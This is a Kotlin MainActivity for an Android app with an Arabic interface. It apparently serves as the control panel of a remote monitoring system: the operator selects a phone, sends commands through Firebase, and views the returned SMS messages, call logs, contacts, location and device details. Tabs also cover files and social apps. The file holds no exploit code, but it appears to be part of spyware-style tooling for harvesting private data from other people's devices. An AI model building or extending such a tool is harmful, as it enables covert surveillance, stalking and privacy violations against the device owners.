package com.abuzahra.control

import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.abuzahra.control.databinding.ActivityMainBinding
import com.abuzahra.control.model.CommandResult
import com.abuzahra.control.model.Device
import com.abuzahra.control.service.FirebaseService
import com.abuzahra.control.ui.dashboard.DashboardFragment
import com.abuzahra.control.ui.control.ControlFragment
import com.abuzahra.control.ui.smscalls.SmsCallsFragment
import com.abuzahra.control.ui.files.FilesFragment
import com.abuzahra.control.ui.social.SocialFragment
import com.abuzahra.control.ui.settings.SettingsFragment
import com.google.firebase.database.ValueEventListener

class MainActivity : AppCompatActivity() {
    private var binding: ActivityMainBinding? = null
    private val b get() = binding!!
    private var resultListener: ValueEventListener? = null
    private var currentDevice: Device? = null

    companion object {
        var selectedDevice: Device? = null
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            binding = ActivityMainBinding.inflate(layoutInflater)
            setContentView(b.root)
        } catch (e: Exception) {
            Log.e("Main", "Binding error: ${e.message}")
            finish()
            return
        }

        // Init Firebase service
        try {
            FirebaseService.init(this)
        } catch (e: Exception) {
            Log.e("Main", "Firebase init error: ${e.message}")
        }

        // Setup bottom navigation
        try {
            b.bottomNav.setOnItemSelectedListener { item ->
                switchFragment(item.itemId)
                true
            }
        } catch (e: Exception) {
            Log.e("Main", "BottomNav error: ${e.message}")
        }

        // Default fragment
        try {
            switchFragment(R.id.nav_dashboard)
        } catch (e: Exception) {
            Log.e("Main", "Init fragment error: ${e.message}")
        }

        // Result panel close
        try {
            b.ivCloseResult.setOnClickListener {
                b.resultPanel.visibility = View.GONE
            }
        } catch (e: Exception) {
            Log.e("Main", "Close result error: ${e.message}")
        }

        // Welcome email in top bar
        try {
            val email = FirebaseService.userEmail
            b.tvTopTitle.text = if (email != null) {
                "مرحباً، ${email.split("@").first()}"
            } else {
                "لوحة التحكم"
            }
        } catch (e: Exception) {
            Log.e("Main", "Welcome text error: ${e.message}")
        }
    }

    private fun switchFragment(itemId: Int) {
        try {
            val frag = when (itemId) {
                R.id.nav_dashboard -> DashboardFragment()
                R.id.nav_control -> ControlFragment()
                R.id.nav_sms_calls -> SmsCallsFragment()
                R.id.nav_files -> FilesFragment()
                R.id.nav_social -> SocialFragment()
                R.id.nav_settings -> SettingsFragment()
                else -> DashboardFragment()
            }
            supportFragmentManager.beginTransaction()
                .replace(R.id.fragmentContainer, frag)
                .commitAllowingStateLoss()
        } catch (e: Exception) {
            Log.e("Main", "Fragment switch error: ${e.message}")
        }
    }

    fun selectDevice(device: Device) {
        try {
            selectedDevice = device
            currentDevice = device
            b.tvTopTitle.text = device.name.ifEmpty { device.model.ifEmpty { "جهاز" } }
            b.tvDeviceCount.text = if (device.isOnline) "متصل" else "غير متصل"
            try {
                b.ivDeviceStatus.setBackgroundResource(
                    if (device.isOnline) R.drawable.bg_status_online else R.drawable.bg_status_offline
                )
            } catch (_: Exception) {}
            listenResults(device)
        } catch (e: Exception) {
            Log.e("Main", "selectDevice error: ${e.message}")
        }
    }

    private fun listenResults(device: Device) {
        try {
            resultListener?.let { FirebaseService.removeResultListener(device.id, it) }
            resultListener = FirebaseService.listenForResult(device.id) { result ->
                if (result.status == "success" || result.status == "error") {
                    runOnUiThread {
                        try { showResult(result) }
                        catch (e: Exception) { Log.e("Main", "showResult error: ${e.message}") }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("Main", "listenResults error: ${e.message}")
        }
    }

    private fun showResult(r: CommandResult) {
        try {
            b.resultPanel.visibility = View.VISIBLE
            b.tvResultTitle.text = when (r.command) {
                "get_sms" -> "الرسائل"
                "get_calls" -> "المكالمات"
                "get_contacts" -> "جهات الاتصال"
                "get_location" -> "الموقع"
                "get_info" -> "معلومات الجهاز"
                "get_battery" -> "البطارية"
                else -> r.command
            }
            b.tvResultContent.text = if (r.result.length > 3000) r.result.take(3000) + "\n...(مقتطع)" else r.result
        } catch (e: Exception) {
            Log.e("Main", "showResult UI error: ${e.message}")
        }
    }

    fun sendCommand(command: String, params: String = "") {
        try {
            val dev = selectedDevice
            if (dev == null) {
                Toast.makeText(this, "اختر جهازاً أولاً", Toast.LENGTH_SHORT).show()
                return
            }
            Toast.makeText(this, "جاري الإرسال: $command", Toast.LENGTH_SHORT).show()
            FirebaseService.sendCommand(dev.id, command, params) { ok ->
                runOnUiThread {
                    Toast.makeText(this, if (ok) "تم الإرسال ✅" else "فشل ❌", Toast.LENGTH_SHORT).show()
                }
            }
        } catch (e: Exception) {
            Toast.makeText(this, "خطأ: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            resultListener?.let { listener ->
                currentDevice?.let { d -> FirebaseService.removeResultListener(d.id, listener) }
            }
        } catch (e: Exception) {
            Log.e("Main", "onDestroy error: ${e.message}")
        }
        binding = null
    }
}
